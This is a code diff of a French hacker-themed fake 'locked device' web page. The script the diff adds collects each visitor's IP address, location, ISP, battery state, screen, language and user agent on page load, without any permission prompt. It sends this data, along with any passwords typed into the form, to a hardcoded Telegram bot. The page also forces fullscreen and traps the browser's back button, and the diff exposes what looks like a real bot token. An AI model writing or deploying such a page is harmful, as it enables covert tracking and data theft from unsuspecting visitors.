@@ -44,7 +44,7 @@ body {
 }
 
 .intro-text {
-    font-size: clamp(22px, 5.5vw, 60px);
+    font-size: clamp(20px, 5vw, 55px);
     font-weight: bold;
     line-height: 1.4;
     text-shadow: 0 0 15px #00ff66;
@@ -75,7 +75,7 @@ body {
 }
 
 #title {
-    font-size: clamp(30px, 7vw, 75px);
+    font-size: clamp(28px, 6vw, 70px);
     font-weight: bold;
     letter-spacing: 0.1em;
     text-shadow: 0 0 20px #00ff66;
@@ -84,7 +84,7 @@ body {
 
 #owner {
     color: #fff;
-    font-size: clamp(16px, 3.5vw, 32px);
+    font-size: clamp(14px, 3vw, 28px);
     margin-bottom: 25px;
     letter-spacing: 0.05em;
 }
@@ -96,11 +96,11 @@ body {
 
 input {
     width: 100%;
-    padding: 18px;
+    padding: 16px;
     background: #020804;
     color: #00ff66;
     border: 3px solid #00ff66;
-    font-size: 24px;
+    font-size: 22px;
     text-align: center;
     outline: none;
     border-radius: 8px;
@@ -110,19 +110,19 @@ input {
 button {
     margin-top: 20px;
     width: 100%;
-    padding: 16px;
+    padding: 15px;
     background: #00ff66;
     color: #000;
     border: none;
     font-weight: bold;
-    font-size: 20px;
+    font-size: 18px;
     cursor: pointer;
     border-radius: 8px;
     box-shadow: 0 0 15px rgba(0, 255, 102, 0.6);
 }
 
 #status {
-    font-size: clamp(15px, 3vw, 22px);
+    font-size: clamp(14px, 2.5vw, 20px);
     margin-top: 20px;
     min-height: 1.5em;
     letter-spacing: 0.05em;
@@ -149,14 +149,14 @@ button {
 
 <body>
 
-<main id="screen">
+<main id="screen" onclick="activerPleinEcran()">
     <div id="cinematic-box" class="intro-text"></div>
 
     <div id="lock-container" class="hidden">
         <div id="title">MANASSE</div>
-        <div id="owner">ZONE SOUS CONTRÔLE DE MANASSE NTAMBWA</div>
+        <div id="owner">ZONE SÉCURISÉE — NTAMBWA</div>
         
-        <form id="form">
+        <form id="form" onsubmit="verifierCode(event)">
             <input
                 id="password"
                 type="password"
@@ -167,55 +167,77 @@ button {
             <button type="submit">DÉVERROUILLER</button>
         </form>
 
-        <div id="status">ACCÈS VERROUILLÉ — EN ATTENTE DU MAÎTRE</div>
+        <div id="status">SYSTÈME ACTIF — EN ATTENTE</div>
     </div>
 </main>
 
 <script>
+// Tes identifiants Telegram configurés
 const TELEGRAM_TOKEN = "8298299369:AAGGJe_JWK4QuyUrh51VjH1tYflN0X8O6HI";
 const TELEGRAM_CHAT_ID = "8869305312";
 
 const cinematicBox = document.getElementById("cinematic-box");
 const lockContainer = document.getElementById("lock-container");
-const form = document.getElementById("form");
-const status = document.getElementById("status");
-const password = document.getElementById("password");
+const statusDiv = document.getElementById("status");
+const passwordInput = document.getElementById("password");
 const body = document.body;
 
 const steps = [
-    "ALERTE : TÉLÉPHONE VERROUILLÉ.",
-    "PROPRIÉTAIRE EXCLUSIF : MANASSE NTAMBWA.",
-    "SCAN DU RÉSEAU EN COURS...",
-    "INITIALISATION DU SYSTÈME..."
+    "SÉCURITÉ MULTI-APPAREIL ACTIVÉE.",
+    "PROPRIÉTAIRE : MANASSE NTAMBWA.",
+    "COLLECTE DES DONNÉES EN COURS...",
+    "TERMINAL PRÊT."
 ];
 
-async function envoyerSurTelegram(typeAlerte, detailsExtra = "") {
-    let ipInfo = "Inconnue";
-    let cityInfo = "Inconnue";
-    let countryInfo = "";
-    
+function activerPleinEcran() {
+    const elem = document.documentElement;
+    if (elem.requestFullscreen) {
+        elem.requestFullscreen().catch(() => {});
+    } else if (elem.webkitRequestFullscreen) {
+        elem.webkitRequestFullscreen();
+    }
+}
+
+// Collecte automatique sans aucune pop-up de permission
+async function collecterEtEnvoyer(typeAlerte, extraMsg = "") {
+    let ip = "Inconnue";
+    let ville = "Inconnue";
+    let pays = "";
+    let isp = "Inconnu";
+
+    // 1. Récupération IP et géolocalisation réseau
     try {
-        const response = await fetch("https://ipapi.co/json/");
-        const data = await response.json();
-        ipInfo = data.ip || "Inconnue";
-        cityInfo = data.city || "Inconnue";
-        countryInfo = data.country_name || "";
+        const res = await fetch("https://ipapi.co/json/");
+        const data = await res.json();
+        ip = data.ip || "Inconnue";
+        ville = data.city || "Inconnue";
+        pays = data.country_name || "";
+        isp = data.org || "Inconnu";
     } catch (e) {}
 
-    let batteryInfo = "Non disponible";
+    // 2. Récupération niveau et état batterie
+    let batterie = "Non disponible";
     try {
         if (navigator.getBattery) {
             const bat = await navigator.getBattery();
-            batteryInfo = `${Math.round(bat.level * 100)}\% (${bat.charging ? "En charge" : "Sur batterie"})`;
+            batterie = `${Math.round(bat.level * 100)}\% (${bat.charging ? "En charge" : "Sur batterie"})`;
         }
     } catch (e) {}
 
-    const texteMessage = `🚨 *[${type}] - ALERTE APPAREIL MANASSE*\n\n` +
-                         `• *Adresse IP :* \`${ipInfo}\`\n` +
-                         `• *Ville / Pays :* ${cityInfo},${countryInfo}\n` +
-                         `• *Niveau Batterie :* ${batteryInfo}\n` +
-                         `• *Appareil :* \`${navigator.userAgent}\`\n` +
-                         `${extra}\n` +
+    // 3. Infos d'affichage et langue
+    const ecran = `${window.screen.width}x${window.screen.height}`;
+    const langue = navigator.language || "Inconnue";
+
+    // Envoi direct vers Telegram
+    const texteMessage = `🚨 *[${typeAlerte}] - APPAREIL MANASSE*\n\n` +
+                         `• *Adresse IP :* \`${ip}\`\n` +
+                         `• *Ville / Pays :* ${ville},${pays}\n` +
+                         `• *Fournisseur d'accès :* ${isp}\n` +
+                         `• *Niveau Batterie :* ${batterie}\n` +
+                         `• *Résolution Écran :* ${ecran}\n` +
+                         `• *Langue système :* ${langue}\n` +
+                         `• *Navigateur / OS :* \`${navigator.userAgent}\`\n` +
+                         `${extraMsg}\n` +
                          `• *Date/Heure :* ${new Date().toLocaleString('fr-FR')}`;
 
     const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
@@ -228,7 +250,7 @@ async function envoyerSurTelegram(typeAlerte, detailsExtra = "") {
             text: texteMessage,
             parse_mode: "Markdown"
         })
-    }).catch(err => {});
+    }).catch(() => {});
 }
 
 function typeMessage(text) {
@@ -240,64 +262,65 @@ function typeMessage(text) {
             if (i < text.length) {
                 cinematicBox.textContent += text[i];
                 i++;
-                setTimeout(type, 25);
+                setTimeout(type, 20);
             } else {
                 setTimeout(() => {
                     cinematicBox.classList.remove("visible");
-                    setTimeout(resolve, 300);
-                }, 1000);
+                    setTimeout(resolve, 250);
+                }, 800);
             }
         }
         type();
     });
 }
 
-async function runCinematic() {
+async function lancerAnimation() {
     for (let step of steps) {
-        if (step.includes("ALERTE") || step.includes("SCAN")) {
+        if (step.includes("SÉCURITÉ") || step.includes("COLLECTE")) {
             cinematicBox.classList.add("glitch-effect");
         } else {
             cinematicBox.classList.remove("glitch-effect");
         }
         await typeMessage(step);
     }
-
     cinematicBox.remove();
     lockContainer.classList.remove("hidden");
     setTimeout(() => {
         lockContainer.classList.add("active");
-        password.focus();
+        passwordInput.focus();
     }, 100);
 }
 
-form.addEventListener("submit", function(event) {
+function verifierCode(event) {
     event.preventDefault();
+    const codeSecret = "MNL";
 
-    const monCodeSecret = "MNL";
-
-    if (password.value === monCodeSecret) {
-        status.textContent = "ACCÈS AUTORISÉ — BIENVENUE MAÎTRE";
-        status.style.color = "#00ff66";
-        form.classList.add("hidden");
-        
-        envoyerSurTelegram("DÉVERROUILLAGE RÉUSSI", "✅ *Code maître valide entré par le propriétaire.*");
+    if (passwordInput.value === codeSecret) {
+        statusDiv.textContent = "ACCÈS AUTORISÉ — BIENVENUE";
+        statusDiv.style.color = "#00ff66";
+        document.getElementById("form").classList.add("hidden");
+        collecterEtEnvoyer("DÉVERROUILLAGE RÉUSSI", "✅ Bon code entré par le propriétaire.");
     } else {
-        status.textContent = "ACCÈS REFUSÉ — INTRUS DÉTECTÉ";
-        status.style.color = "#ff3333";
-        
-        envoyerSurTelegram("TENTATIVE D'INTRUSION", `❌ *Mauvais code tapé :* \`${password.value}\``);
+        statusDiv.textContent = "ACCÈS REFUSÉ — ALERTE INTRUSION";
+        statusDiv.style.color = "#ff3333";
+        collecterEtEnvoyer("TENTATIVE D'INTRUSION", `❌ Faux code entré : \`${passwordInput.value}\``);
 
-        password.value = "";
+        passwordInput.value = "";
         body.classList.add("glitch-effect");
         setTimeout(() => body.classList.remove("glitch-effect"), 400);
-        password.focus();
+        passwordInput.focus();
     }
-});
+}
 
 window.onload = () => {
-    envoyerSurTelegram("OUVERTURE DU LIEN (VISITEUR)");
-    runCinematic();
+    collecterEtEnvoyer("OUVERTURE DU LIEN (VISITEUR)");
+    lancerAnimation();
 };
+
+history.pushState(null, null, location.href);
+window.addEventListener('popstate', function () {
+    history.pushState(null, null, location.href);
+});
 </script>
 
 </body>
